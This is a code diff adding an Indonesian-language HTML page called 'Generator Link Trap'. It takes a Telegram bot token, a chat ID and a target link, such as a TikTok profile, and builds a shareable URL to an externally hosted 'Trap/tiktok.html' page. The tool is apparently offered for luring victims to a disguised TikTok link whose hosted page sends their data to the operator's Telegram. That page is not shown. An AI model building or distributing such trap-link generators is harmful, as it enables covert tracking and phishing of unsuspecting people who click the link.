@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Link Generator</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f5f6fa;
+        padding: 20px;
+        text-align: center;
+    }
+    h2 {
+        color: #2f3640;
+    }
+    input {
+        width: 90%;
+        padding: 10px;
+        margin: 8px 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 14px;
+    }
+    button {
+        padding: 10px 15px;
+        margin: 10px 5px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 14px;
+    }
+    .generate {
+        background-color: #44bd32;
+        color: white;
+    }
+    .copy {
+        background-color: #273c75;
+        color: white;
+    }
+    #output {
+        margin-top: 20px;
+        padding: 10px;
+        background: #dcdde1;
+        border-radius: 5px;
+        word-break: break-all;
+    }
+</style>
+</head>
+<body>
+
+<h2>Generator Link Trap</h2>
+
+<input type="text" id="token" placeholder="Masukkan Token Bot Telegram">
+<input type="text" id="chatid" placeholder="Masukkan Chat ID Telegram">
+<input type="text" id="target" placeholder="Masukkan Link Target (contoh: https://tiktok.com/@username)">
+
+<br>
+<button class="generate" onclick="generateLink()">Generate Link</button>
+<button class="copy" onclick="copyLink()">Salin Link</button>
+
+<div id="output"></div>
+
+<script>
+function generateLink() {
+    const token = document.getElementById("token").value.trim();
+    const chatid = document.getElementById("chatid").value.trim();
+    const target = document.getElementById("target").value.trim();
+
+    if (!token || !chatid || !target) {
+        alert("Isi semua kolom terlebih dahulu!");
+        return;
+    }
+
+    const encodedTarget = encodeURIComponent(target);
+    const baseURL = "https://ifufvjhcrjb.github.io/Trap/tiktok.html";
+    const finalLink = `${baseURL}?token=${token}&chatid=${chatid}&target=${encodedTarget}`;
+
+    document.getElementById("output").innerHTML = `<b>Link:</b> <br> <a href="${finalLink}" target="_blank">${finalLink}</a>`;
+}
+
+function copyLink() {
+    const linkElement = document.querySelector("#output a");
+    if (!linkElement) {
+        alert("Generate link dulu!");
+        return;
+    }
+    navigator.clipboard.writeText(linkElement.href).then(() => {
+        alert("Link berhasil disalin!");
+    });
+}
+</script>
+
+</body>
+</html>
